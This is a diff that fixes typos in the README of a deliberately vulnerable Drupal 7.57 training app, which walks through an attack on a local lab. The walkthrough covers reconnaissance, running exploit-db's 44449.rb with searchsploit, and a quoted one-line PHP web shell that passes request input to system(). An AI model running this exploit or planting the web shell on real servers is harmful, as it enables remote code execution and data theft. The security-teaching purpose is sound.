@@ -4,7 +4,7 @@
     <img src="images/attack1.png"/>
 </p>
 
-Cimentech is a simple web application built with Drupal that contains an example of a component with a known vulnerabilty and it's main goal is to demonstrate how an attacker could exploit it.
+Cimentech is a simple web application built with Drupal that contains an example of a component with a known vulnerability and its main goal is to demonstrate how an attacker could exploit it.
 
 ## Index
 
@@ -39,11 +39,11 @@ Then simply visit [localhost:80][App] ! 😆
 
 To properly understand how this application works, you could:
 
-- Visit it's homepage!
+- Visit its homepage!
 
 ## Attack narrative
 
-Now that you know the purpose of this app, what could possibly go wrong? The following section describes how an attacker could identify and eventually find sensitive information about the app or it's users. We encourage you to follow these steps and try to reproduce them on your own to better understand the attack vector! 😜
+Now that you know the purpose of this app, what could go wrong? The following section describes how an attacker could identify and eventually find sensitive information about the app or its users. We encourage you to follow these steps and try to reproduce them on your own to better understand the attack vector! 😜
 
 ### 👀
 
@@ -54,7 +54,7 @@ It's possible to reach the server's web application from the standard HTTP port 
 
 <img src="images/attack1.png" align="center"/>
 
-Afterwards, by having a look at the `/robots.txt` file, it's possible to find the `CHANGELOG.txt` file in the `Disallow` field, as depicted by the image below:
+Afterward, by having a look at the `/robots.txt` file, it's possible to find the `CHANGELOG.txt` file in the `Disallow` field, as depicted by the image below:
 
 <img src="images/attack2.png" align="center"/>
 
@@ -62,11 +62,11 @@ When accessed, an indication of the version of the Content Management System (Dr
 
 <img src="images/attack3.png" align="center"/>
 
-Having the CMS version, it's possible to check on [exploit-db][3] if there are any exploits associated with that version, in this case, Drupal 7.57. The results of the search are depicted on the image below:
+Having the CMS version, it's possible to check on [exploit-db][3] if there are any exploits associated with that version, in this case, Drupal 7.57. The results of the search are depicted in the image below:
 
 <img src="images/attack4.png" align="center"/>
 
-By using [searchsploit](https://www.exploit-db.com/searchsploit), an attacker could also find this same result via terminal. To install it, simply type the following in your OSX terminal (keep in mind it might trigger your anti-virus software) :
+By using [searchsploit](https://www.exploit-db.com/searchsploit), an attacker could also find this same result via a terminal. To install it, simply type the following in your OSX terminal (keep in mind it might trigger your anti-virus software) :
 
 ```sh
 brew install exploitdb
@@ -86,7 +86,7 @@ cp /usr/local/opt/exploitdb/share/exploit-database/exploits/php/webapps/44449.rb
 
 ## 🔥
 
-Running the malicious Ruby code, we have evidence that a remote code execution is possible on the web server, using the following commands as shown below:
+Running the malicious Ruby code, we have evidence that remote code execution is possible on the web server, using the following commands as shown below:
 
 ```sh
 ruby /tmp/44449.rb http://localhost
@@ -104,13 +104,13 @@ The exploit works by adding into the server a malicious `s.php`, which allows re
 <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
 ```
 
-Using the exploit's "fake shell", we can type a command, such as `whoami`, to verify that we indeed have a RCE on the server, as shown by the image:
+Using the exploit's "fake shell", we can type a command, such as `whoami`, to verify that we indeed have an RCE on the server, as shown by the image:
 
 <img src="images/attack6.png" align="center"/>
 
 ## Secure this app
 
-How would you migitate this vulnerability? After your changes, an attacker should not be able to:
+How would you mitigate this vulnerability? After your changes, an attacker should not be able to:
 
 * Execute code remotely through the exploit above
 
